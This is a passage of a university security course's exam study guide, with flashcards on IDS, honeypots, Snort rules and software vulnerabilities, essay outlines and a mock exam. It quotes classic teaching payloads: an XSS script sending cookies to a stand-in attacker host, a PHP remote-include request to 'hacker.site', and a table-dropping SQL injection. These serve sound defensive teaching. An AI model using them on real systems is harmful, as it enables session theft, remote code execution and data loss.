copy of all traffic; NIC 1 on the tap, usually no IP, promiscuous mode; NIC 2 with an IP for
the management server. Wireless sensors inline in an AP or passive on the air; only they see
wireless protocol attacks (wireless DoS, session hijacking, rogue AP); WIDS is a NIDS only for
wireless.

**D15.** Honeypots: definition, three objectives, the logic, the value rule, low versus high
interaction with trade-offs, honeynet.

Decoy systems that lure attackers away from critical systems. Divert, collect
information on techniques and tools, gain time for administrators to respond. Filled with
fabricated valuable looking information no legitimate user accesses, so any access is
suspicious; instrumented with monitors and loggers; the attack seems to succeed so the
attacker is tracked without exposing production. No production value: inbound is a probe,
scan or attack; outbound means it was compromised. Low interaction emulates services, realistic
initial interaction, no full services; enough for early stages and alerts in a distributed
IDS. High interaction is a real OS with real services, instrumented; more realistic, holds
the attacker longer; needs far more resources, and if compromised it attacks others, legal
and reputation problems. Honeynet Project: whole networks of honeypots emulating a company
with simulated traffic.

**D16.** The three honeypot positions with advantages and disadvantages. Honeyfiles.

External, before the firewall: tracks scans of unused IPs, no risk to the internal
network, reduces noise on firewall and internal sensors; little capture of insiders. DMZ:
monitors attacks on public services; contamination risk for other DMZ systems; the external
firewall blocks most traffic (only 80 and 443), so either open it and raise risk or limit the
honeypot. Internal: captures internal attacks, the most important; detects a misconfigured
firewall; high risk, a compromised honeypot attacks internal systems, the firewall sees the
attacker's traffic as permitted, exception rules needed. Honeyfiles: fake documents with
realistic names ("Salarios Diretoria.xlsx") as bait; any access is suspicious.

**D17.** Write the Snort rule header and explain each part. Explain msg, flow, content,
depth, threshold, reference, classtype, sid, rev.

`alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]`: alert generates an alert;
tcp only TCP; $HOME_NET any, source internal network, any port; -> direction; $EXTERNAL_NET
![7680,1521], destination external network, except ports 7680 and 1521. msg: the log
message "ET P2P BitTorrent peer sync". flow:established,to_server: only established TCP
connections toward the server. content:"|00 00 00 0d 06 00|": search that byte sequence.
depth:6: only in the first 6 payload bytes. threshold: type limit, track by_dst, seconds 300,
count 1: one alert per destination every 300 s. reference: URL of the BitTorrent protocol
documentation. classtype:policy-violation: category. sid:2000334: unique ID. rev:14: revision 14. metadata: created 2010_07_30, confidence Medium, severity Informational, updated
2025_06_30.

**D18.** The Snort pipeline from packet to alert. Which approach is the BitTorrent rule?

Network traffic, packet decoder, preprocessor, detection engine with the rules,
logging and alerting system, output modules, output as alert or log. The rule is signature
detection: a fixed byte pattern at a fixed position in a known protocol state, no baseline,
no training; Snort is the rule based NIDS example.

**D19.** IDS versus IPS in terms of action. Why is a packet filter insufficient for
detection?

IDS detects, logs and alerts, can use a passive sensor on a copy of the traffic. IPS
blocks the attack, needs an inline sensor, risks blocking legitimate traffic on a false
positive and adds delay. Packet filter: headers only, no payload, no application attacks,
limited log, no context between packets, bypassed by spoofing and fragments, never sees
traffic that bypasses it or insiders; detection needs payload, packet sequences and host data.

**D20.** HIDS or NIDS for: anomalous system calls, port scan, web server exploit, sensitive
file access. Where does combining them help most?

System calls: HIDS, the preferred source, STIDE. Port scan: NIDS, a pattern across
the segment. Web exploit: NIDS with signatures, but HIDS on the server when HTTPS blinds the
NIDS. Sensitive files: HIDS, checksums, audit records, honeyfiles. Combination (distributed
or hybrid IDS) helps most on the web server: the NIDS sees the request, the HIDS sees the
effect and covers HTTPS; and on exfiltration after file access, visible only on the network.

### 7.3 Deck V: software vulnerabilities

Source: Part 3.

**V1.** The root of the problem. The five OWASP Top 10 code flaws. The three CWE/SANS
Top 25 categories with two examples each.

Bad programming practices cause many vulnerabilities; awareness is the first step.
OWASP: unvalidated input, XSS, buffer overflow, injection flaws, improper error handling.
CWE/SANS: insecure interaction between components (SQL injection, OS command injection, XSS,
CSRF, dangerous upload, open redirect); risky resource management (buffer overflow, path
traversal, download without integrity check, dangerous function, buffer size miscalculation,
format string, integer overflow); porous defences (missing authentication or authorisation,
hard-coded credentials, missing encryption, untrusted input in a security decision,
unnecessary privileges, broken cryptography, unlimited login attempts, hash without salt).

**V2.** How does software security differ from software quality? Who chooses the probability
distribution?

Quality: failures follow some probability distribution; structured design and tests
on likely inputs remove most bugs; what matters is how often bugs trigger. Security: the
attacker chooses the distribution, aiming at exploitable bugs triggered by inputs far from the
expected, so common tests miss them. Secure code assumes nothing and checks every error.

**V3.** Define defensive programming and its key rule. What does the software do under
attack?

Designing and implementing software so that it keeps working under attack; it detects
erroneous conditions caused by an attack and continues safely or fails gracefully. Rule: never
assume anything, verify every assumption, handle every possible error state.

**V4.** Why do programmers not write defensively? Business pressure, maintenance, mindset,
maturity, standards.

Programmers focus on the steps to success and the normal flow, not on failure points;
error handling adds code and time, conflicting with short schedules and market advantage;
unless security is a design goal from the start, a secure program is unlikely. Maintenance:
verify assumptions, errors and interactions with existing code, or a secure program becomes
vulnerable. Mindset: not "most users, most of the time"; paranoia is a virtue; normal tests
miss unusual inputs; resilience to any unexpected condition. Maturity: society tolerates
software failure far more than collapsing bridges; standards ISO 12207 and SEI06 name
security as a design goal; SAFECode publishes best practices; threat modelling belongs in
design.

**V5.** The four critical areas of interaction. Define input and its sources. Two concerns.

Input handling, algorithm implementation, interaction with other components, output.
Input: any data from outside the program whose value the programmer does not know when
coding; obvious sources keyboard, mouse, files, network; indirect sources environment,
configuration files, OS values. Concerns: size, and meaning or interpretation.

**V6.** Buffer overflow: the assumption, the consequence, why tests miss it, the fixes.

Assumption of a maximum size, fixed buffers of 512 or 1024 bytes, no check that the
input fits; the overflow compromises execution; tests use expected inputs and rarely inputs
large enough; library routines may not limit copies. Fixes: safe copy routines, treat all
input as dangerous, dynamic buffers or processing in buffer sized blocks, check requested
memory against available memory, fail gracefully (blocks, discard the excess, terminate),
check at every entry point of unknown data.

**V7.** The lecture C example: what overflows into what, why, what GCC prints, which flag
reproduces the attack.

`var_outrasInfos[10]` and `var_nome[10]` sit on the stack; `my_gets` copies characters
until newline with no length check; more than 10 characters overflow into `var_nome`, so
"Gabriel" is overwritten by the excess. A long input then triggers
`*** stack smashing detected ***: terminated` and SIGABRT: a GCC protection detected the
corrupted stack at function return. Reproduce the classic attack with
`gcc -fno-stack-protector`, then read `man 7 signal`.

**V8.** Interpretation of input: binary versus text, Heartbleed, character sets.

Binary data is assumed to be integers, floats, strings or structures, and the
assumption must be validated as values are read (Ethernet, IP, TCP; DNS, SNMP, NFS against
their abstract syntax). Heartbleed, OpenSSL 2014: no check of the requested length against
the supplied data, a buffer over-read, leaked user names, passwords and private keys. Text:
bytes become characters through a character set (ASCII, Windows and macOS extensions,
internationalisation); identify the set, then the meaning (integer, file name, URL, e-mail)
and confirm the type, or the attacker influences the program.

**V9.** Injection attacks: definition, mechanism, where common. SQL injection example,
input and prevention.

A wide class of flaws from invalid handling of input where the input influences the
flow of execution; common mechanism: input passed as a parameter to an auxiliary program whose
output is used; frequent in scripting languages (Perl, PHP, Python, sh) and in web CGI
scripts processing HTML forms. SQL injection: `$query = "SELECT * FROM suppliers WHERE name
= '" . $name . "';"`; input `Bob` works, input `Bob'; drop table suppliers` returns the record
and deletes the table; SQL metacharacters. Prevention: validate (escape or reject), sanitising
functions, placeholders or SQL parameters instead of concatenation, stored procedures.

**V10.** Code injection in PHP: the include scenario, the GET example, the two PHP features,
the defences. Insecure deserialisation.

`include $path . 'functions.php'`: the script is called directly; PHP assigned
global variables from the HTTP request and `include` accepted remote URLs; `GET
/calendar/embed/day.php?path=http://hacker.site/hack.txt?&cmd=ls` makes `$path` the
attacker's URL and runs remote code with the web server's privileges. Defences: block
automatic assignment of form fields to globals (array, fetch by name; may break legacy code);
only constants in include and require, or validate right before use; identify all inputs,
validate assumptions, understand how each function interprets its arguments. Variants: e-mail
injection, format string, interpreter injection. Deserialisation: a byte stream rebuilt into
an object; accepting serialised objects from untrusted sources lets a manipulated stream run
the attacker's logic during reconstruction, often RCE.

**V11.** XSS: the cookie example, obfuscation, prevention, the nature of the flaw, the real
target.

A guest book comment with `<script>document.location='http://hacker.web.site/
cookie.cgi?'+document.cookie</script>` sends the next visitor's cookie to the attacker, who
impersonates them. Obfuscation with HTML entities (`&#60;&#115;...`), interpreted identically
by the browser. Prevention: examine input, remove or escape dangerous code, validators
translate entities before checking; sanitise output. A flaw of both input and output handling;
the target is the next user, not the server; related to CSRF and HTTP response splitting.

**V12.** Whitelist versus blacklist. Canonicalisation with the "/" example. The casting
vulnerability. Fuzzing.

Whitelisting compares with what is wanted and accepts only the valid: recommended.
Blacklisting compares with known dangerous values and fails on new evasions. Usually regular
expressions; on failure reject or sanitise. Canonicalisation: characters have several
encodings (HTML, UTF-8); "/" has forms beyond 2F; long encodings bypassed filters (IIS,
1990s); reduce the input to a unique minimal standard form before validation; use anti-XSS
libraries or frameworks. Casting: a size read as unsigned and compared as signed; a value with
the top bit set reads as negative, passes the maximum check, overflows on allocation or copy.
Fuzzing: Barton Miller 1989, random input to find crashes; simple, cheap, assumption free,
finds exploitable flaws; may miss bugs needing specific conditions; used by developers and
attackers.

**V13.** Algorithm flaws: four historical examples. Memory and concurrency risks and defences.

Netscape's predictable random generator broke its cryptography; TCP session
hijacking through predictable initial sequence numbers; Ken Thompson 1984, a malicious
compiler inserting invisible backdoors; the Morris Worm using the DEBUG command of sendmail.
Memory: C's weak typing allows pointer manipulation, overflows and corrupted structures;
defence: strong typing or validated casts; unfreed memory leaks lead to exhaustion and DoS,
automatic management preferable. Concurrency: race conditions corrupt shared values without
synchronisation; misuse of primitives causes deadlock, which attackers trigger for DoS;
choose primitives correctly, limit shared areas.

**V14.** OS interaction: environment variables and their attacks, least privilege practices,
modularisation, chroot, file shredding.

The OS builds the process environment (code, data, arguments, environment
variables), all external input to validate; permissions by user and group, excessive access
is dangerous. Environment variables inherited from the parent (PATH, IFS, LD_LIBRARY_PATH):
PATH attack runs a fake `grep` from a privileged script; LD_LIBRARY_PATH loads malicious
libraries; mitigation: no privileged shell scripts, compiled wrappers that clean the
environment, reset critical variables at start. Least privilege: minimum privileges; a
compromised root program gives full control; prefer group privileges; web servers should not
own all their files; use root only to bind low ports then drop. Modularisation: small modules,
elevated privilege only where needed and briefly (Postfix). Chroot jail limits the file system
view to one directory; hard to configure, escape or failure if wrong. Shredding: overwriting a
file does not erase it because of I/O buffers, file system buffers and smart controllers
(SSDs avoid rewriting the same block); force flush and sync.

**V15.** Output: the common origin problem, two attacks through output, three mitigations.

Output is binary or textual and must strictly match the expected format; users
assume the trusted program generated and validated it, which fails when one user's input is
shown to another (comments, forums) without sanitisation. Attacks: VT100 escape sequences
reprogrammed function keys to run commands when text was viewed; XSS runs third party
JavaScript in the victim's browser through the browser's trust in the site. Mitigation: the
relaying program is responsible, whitelist safe content; specify the character encoding
explicitly (Content-Type) so the browser does not assume an insecure default; the target is
the user or display device, not the server, but the software's reputation suffers.

---

## 8. Essay skeletons

Every long answer has the same four parts.

1. Which problem the mechanism solves.
2. How it works, one sentence, with the number.
3. How it fails, or what it does not provide.
4. The fix, or the modern replacement.

**E1. "Stateless versus stateful packet filter."**

- **Problem:** let replies to internal clients in without opening every high port.
- **How:** stateless rules on L3 and L4 headers, Table 9.1 with 5 rules; the reply rule must
  permit dest > 1023 inbound; refinements with source port 25 and the ACK flag.
- **Fails:** no context, an attacker reaches port 8080 from port 5150, or sends from source
  port 25; no payload, limited log, spoofing, tiny fragments, misconfiguration.
- **Fix:** the state table of active outbound connections, inbound to high ports only on a
  match; sequence number tracking; limited DPI for FTP, IM, SIPS. For application attacks,
  an application-level gateway.

**E2. "Positive filter versus negative filter."**

- **Problem:** decide the posture of the firewall for traffic no rule mentions.
- **How:** positive filter permits listed traffic and ends with deny (default discard,
  "not permitted is prohibited"); negative filter denies listed traffic and ends with allow
  (default forward, "not prohibited is permitted").
- **Fails:** positive is visible to users as an obstacle and needs a rule per service;
  negative leaves every forgotten service open and the admin reacts to each new threat;
  "others: no" needs port ranges.
- **Fix:** positive filter for business and government and for any server with a requirement
  table; negative only in open organisations such as universities. Rules derive from the
  policy, which derives from the risk assessment.

**E3. "Signature versus anomaly detection."**

- **Problem:** decide whether observed behaviour is an intrusion, with the overlap between
  intruder and user behaviour and the base-rate fallacy.
- **How:** signatures compare data with known malicious patterns (Snort rule with a 6 byte
  content); anomaly builds a baseline in a training phase and flags deviations in the
  detection phase (statistical, knowledge-based, machine learning).
- **Fails:** signatures miss zero-day and need constant signature work; anomaly produces more
  false alarms (ML rate unacceptable today), needs training and good metrics, and cannot
  separate insiders (Anderson).
- **Fix:** use both, in HIDS and NIDS, in a distributed IDS, inside defence in depth with
  cryptography, audit trails, strong authentication.

**E4. "HIDS versus NIDS, and the encryption problem."**

- **Problem:** cover both the network perimeter and the activity inside sensitive hosts.
- **How:** NIDS examines packets at selected points at L3, L4, L7, through inline or passive
  sensors (tap, NIC without IP); HIDS examines system call traces, audit records, file
  checksums, Registry on one host.
- **Fails:** NIDS is blind inside TLS/SSL and sees nothing that bypasses the network; HIDS
  covers one host, costs its resources, and intruders edit its logs; system calls are
  problematic on Windows.
- **Fix:** distributed or hybrid IDS with a central analyser; HIDS on endpoints for decrypted
  data; terminate encryption at the firewall or proxy and place the sensor behind it;
  honeypots to divert and observe.

**E5. "Buffer overflow and defensive programming."**

- **Problem:** input larger than the programmer assumed corrupts memory and lets the attacker
  choose the failure.
- **How:** a fixed buffer (512, 1024 or the example's 10 bytes) filled by a routine with no
  length check; the excess overwrites adjacent variables or the return address; GCC's stack
  protector aborts with "stack smashing detected", disabled by `-fno-stack-protector`.
- **Fails:** common tests use expected inputs; library routines do not limit copies; C's weak
  typing allows it; unsigned to signed casts defeat size checks; Heartbleed is the read side.
- **Fix:** defensive programming, assume nothing and verify everything; safe copy routines,
  dynamic buffers, block processing, graceful failure; validate every input source, whitelist,
  canonicalise first; fuzzing; strongly typed languages; least privilege so a compromise
  gains little.

## 9. Mock exam (45 minutes, no notes)

Answers in the decks of section 7.

1. State the three firewall design goals of [BELL94] and how each is achieved. (F2)
2. Define an IDS and name its three logical components. (D4)
3. Why does the lecture C program overwrite "Gabriel"? What does GCC print? (V7)
4. Positive versus negative filter: which rule is implicit at the end of each? (F5)
5. Signature detection cannot detect which kind of attack? Why? (D9, D10)
6. Define defensive programming and its key rule. (V3)
7. Explain the flaw in rule 4 of Table 9.1 and the exploit on port 8080. (F7)
8. Loose versus tight interpretation: which error grows in each? (D6)
9. SQL injection: show the input that deletes the table and name two defences. (V9)
10. What does the stateful firewall add to the packet filter? What is the state table? (F9)
11. Four data sources of a HIDS, with one disadvantage each. (D11)
12. Whitelisting versus blacklisting: which is recommended and why? (V12)
13. Why is the ACK flag needed in the refined rule 4, beyond source port 25? (F7)
14. Inline versus passive sensor: which one can be an IPS? (D14)
15. What is canonicalisation and why must it come before validation? (V12)
16. Application-level versus circuit-level gateway: which examines the payload? (F11, F12)
17. The three honeypot positions: which captures insiders, which carries no internal risk? (D16)
18. Heartbleed: year, software, class of flaw, what leaked. (V8)
19. Three purposes of the internal firewall in a DMZ. (F15)
20. Write the Snort rule header and explain `![7680,1521]`. (D17)
21. XSS: who is the real target, and which two handling steps failed? (V11)
22. Where should IPsec live: behind the firewall, in the router, or in the firewall? Why? (F16)
23. Explain the base-rate fallacy for an IDS. (D6)
24. PATH and LD_LIBRARY_PATH attacks, and two mitigations. (V14)
25. Why is DROP stealthier than REJECT against a port scan? (F18)
26. The six steps of the attack methodology, one example each. (D3)
27. The five OWASP code flaws and the three CWE/SANS categories. (V1)
28. SOCKS: RFC, port, the five TCP steps. (F12)

---

**Useful files in the repository:**

- `ICP473-Slides/slides-ICP473-Segurança-da-Informação.pdf` (619 pages, P3 starts at 448)
- `ICP473-Slides/slides-por-aula/aula14-firewalls.tex`, `aula15-idsips.tex`,
  `aula16-vulnSoftware.tex`
- `ICP473-Listas/lista8.pdf`, `lista9.pdf`

Compile and run the buffer overflow program of slides 588 to 592 before the exam, with and
without `-fno-stack-protector`.
